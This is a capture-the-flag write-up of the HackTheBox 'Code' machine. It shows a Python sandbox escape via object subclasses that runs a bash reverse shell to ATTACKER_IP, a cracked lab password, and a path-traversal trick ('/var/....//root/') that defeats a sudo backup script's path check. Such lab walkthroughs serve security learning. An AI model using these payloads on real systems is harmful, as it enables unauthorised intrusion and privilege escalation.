---
title: HackTheBox Code Writeup
authors: Samarth
date: 2025-03-30 18:00:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, Python Code Editor, Command Injection]
math: true
mermaid: true
---

![Dog - HTB](/assets/images/writeups/Code-HTB/banner.png)

## TL;DR

This writeup covers the [__Code__](https://app.hackthebox.com/machines/Code){:target="_blank"} machine, an easy-rated Linux box. The challenge began with a `Python code editor` running on port 5000, which restricted certain functions. By exploring its limitations, I discovered a way to execute system commands and gain access as app-production. While navigating the system, I found a database containing password hashes, cracked them and logged in as user. Checking for elevated privileges revealed a backup script that only allowed specific directories. By manipulating its configuration file, I tricked the script into giving me access to `/root/`, ultimately leading to the final flag.

## Scanning Network

I began by performing an Nmap scan, which reveals open ports 22 and 5000, corresponding to OpenSSH and Gunicorn 20.0.4. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.62 -oN scan/normal.scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 18:02 IST
Nmap scan report for 10.10.11.62
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Python code editor was hosted on a **Gunicorn** HTTP server.

## Enumeration

**Gunicorn** ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model ported from Ruby’s Unicorn project. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.

I visited __http://10.10.11.62:5000__.

![Browser View](/assets/images/writeups/Code-HTB/1.png)

The Python code editor provided user registration and login functionality.

I registered a user, logged in, and used the Python code editor.

![Registering a user](/assets/images/writeups/Code-HTB/2.png)

I tried some simple Python programs to test the Python code editor. I started with a "Hello, World!" program.  

![Hello World! program](/assets/images/writeups/Code-HTB/3.png)

When I used the `os` module, the code editor returned an error stating that restricted keywords were not allowed. 

![os.system("whoami")](/assets/images/writeups/Code-HTB/4.png)

Since importing certain modules was restricted, it meant that these modules were blacklisted on the backend.  

I tried to identify the available built-in functions.  

![built-in function](/assets/images/writeups/Code-HTB/5.png)

Built-in functions were also restricted on the backend.

I tried using `eval()` and `exec()` built-in function.

**eval(expression, globals=None, locals=None)** is a built-in Python function that evaluates a string expression as a Python expression and returns the result.

![eval() function](/assets/images/writeups/Code-HTB/25.png)

**exec()** is a built-in Python function that executes a string or block of Python code dynamically.

![exec() function](/assets/images/writeups/Code-HTB/26.png)

I tried using an indirect import.  

**Indirect import** bypasses standard `import` statements by using functions like `__import__` or dynamic execution methods such as `exec()`.

![Indirect imports](/assets/images/writeups/Code-HTB/6.png)

#### Hitting a Wall: Everything is Blacklisted!

So far, I had explored multiple ways to execute system commands, but every approach seemed to be locked down. Here’s what I tried and failed:  

✅ Direct imports (e.g., **import os**, **import sys**) ? Blocked.

✅ Built-in functions (e.g., **eval()**, **exec()**, **open()**) ? Restricted.

✅ Indirect imports (e.g., **__import\__()** or **exec("import os")**) ? No luck.

I tried to list all available global variables as well as all loaded modules. 

![All available global variables](/assets/images/writeups/Code-HTB/7.png)

![All loaded modules](/assets/images/writeups/Code-HTB/8.png)


#### Discovering Preloaded Modules: A False Hope?

After failing to import modules directly, I explored alternative ways to check what was already loaded in memory. I attempted:  

✅ Listed global variables using **globals()**.  

✅ Checked preloaded modules using **sys.modules.keys()**.  

Surprisingly, I was able to retrieve a list of global variables and loaded modules. However, there was a catch:  

❌ All useful modules were blacklisted.  

❌ Even though `sys.modules` revealed entries like `os` and `subprocess`, accessing them resulted in errors.  

This meant that even though I could see the modules, I couldn't use them—a classic case of security through restriction!  

It was time to enumerate the available attributes and methods for the `int` class.  

![Enumerating attributes and methods for the int class](/assets/images/writeups/Code-HTB/9.png)

There were many attributes and methods listed. I confirmed the type of the `__class__` attribute.  

![__class__ type](/assets/images/writeups/Code-HTB/10.png)

I confirmed that `int` was an instance of `type`. I needed to check the type of `__base__`.  

![__base__ type](/assets/images/writeups/Code-HTB/11.png)

The above response confirmed that `type` inherited from `object`, making `object.__subclasses__()` accessible.  

I was able to list all subclasses of `object`.  

![All subclasses of object](/assets/images/writeups/Code-HTB/12.png)

Looked for `subprocess.Popen` in subclasses.

![subprocess.Popen subclass](/assets/images/writeups/Code-HTB/13.png)

**subprocess.Popen** (short for Process Open) is a class in Python’s subprocess module that allows you to start and interact with system processes. It is more powerful than os.system() because it gives full control over input, output, and errors of the command being executed.

Looked for the index of **subprocess.Popen**.  

![Index of subprocess.Popen](/assets/images/writeups/Code-HTB/14.png)

Summed up all the previous trials on the code editor and crafted a payload to utilize `subprocess.Popen` to run a Bash reverse shell command.

## Exploitaion

**Crafted Payload**

```bash
().__class__.__base__.__subclasses__()[317](["/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
```

Set up a Netcat listener to receive the reverse shell after executing the above command.

![Reverse shell](/assets/images/writeups/Code-HTB/15.png)

While browsing through directories, I found a database file that disclosed two users, martin and development, along with their MD5 hashes.

![Database.db](/assets/images/writeups/Code-HTB/16.png)

Attempted to crack those MD5 hashes.  

![MD5 cracked hashes](/assets/images/writeups/Code-HTB/17.png)

Logged in as the `martin` user using the cracked password.

```bash
martin:nafeelswordsmaster
```

![Martin user](/assets/images/writeups/Code-HTB/18.png)

## Post Exploitaion

I ran `sudo -l` to check the list of commands that the current user could run with elevated privileges using `sudo`.

![sudo -l](/assets/images/writeups/Code-HTB/19.png)

`backy2` is a deduplicating block based backup software which encrypts and compresses by default.

The primary usecases for backy are:

* fast and bandwidth-efficient backup of ceph/rbd virtual machine images to S3 or NFS storage

* backup of LVM volumes (e.g. from personal computers) to external USB disks

While executing `backy.sh`, it requires <task.json> file.

![Backy.sh usage](/assets/images/writeups/Code-HTB/20.png)

While browsing the directories, I came across the `backup` directory, which contained a sample `task.json` file.

![sample task.json](/assets/images/writeups/Code-HTB/21.png)

The JSON configuration file contained archive directories and stored them in `/home/martin/backups/`. It enabled multiprocessing for faster execution, disabled verbose logging, and specified `/home/app-production/app` as the directory to back up while excluding hidden files (`.*`).  

Next, I needed to consider the root directory for archiving using `backy.sh`. I modified the parameters by setting the path to `/root/`, enabling verbose logging, and removing the exclude parameter to include all files and directories.

```json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": true,
	"directories_to_archive": [
		"/root/"
	]
}
```

![/root/ dir usage](/assets/images/writeups/Code-HTB/22.png)

An error occurred because only the `/var/` and `/home/` directories were allowed.  

I used a path traversal trick to bypass path validation and include the `/root/` directory.  

**Crafted path**

```bash
/var/....//root/
```

If `backy.sh` was only checking for the existence of the `/var/` directory and not validating the full path, then the crafted path would bypass the check and archive the `/root/` directory.  

```json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": true,
	"directories_to_archive": [
		"/var/....//root/"
	]
}
```

![Success](/assets/images/writeups/Code-HTB/23.png)

Once the archive was successfully created, I found it in the `/backups/` directory in `.bz2` format. I then transferred the file to my machine and extracted it.

![Root Flag](/assets/images/writeups/Code-HTB/24.png)

![Pwned](/assets/images/writeups/Code-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.
